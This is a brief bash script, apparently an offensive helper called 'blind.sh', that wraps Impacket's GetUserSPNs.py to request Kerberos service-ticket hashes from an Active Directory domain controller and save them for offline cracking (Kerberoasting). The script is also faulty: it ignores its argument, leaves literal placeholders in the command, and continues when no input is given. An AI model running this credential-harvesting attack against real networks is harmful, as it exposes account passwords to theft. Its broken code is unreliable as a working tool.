#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

if [ $# -eq 0 ]
  then
    echo "No arguments supplied"
fi

echo ""
echo "Syntax: blind 'DC IP address'" 
echo "Example: ./blind.sh 10.10.10.10"
echo " "
GetUserSPNs.py -request -dc-ip <Domain_Controller_IP> <Domain>/<Username>[:<Password>] -outputfile <output_file_for_hashes>
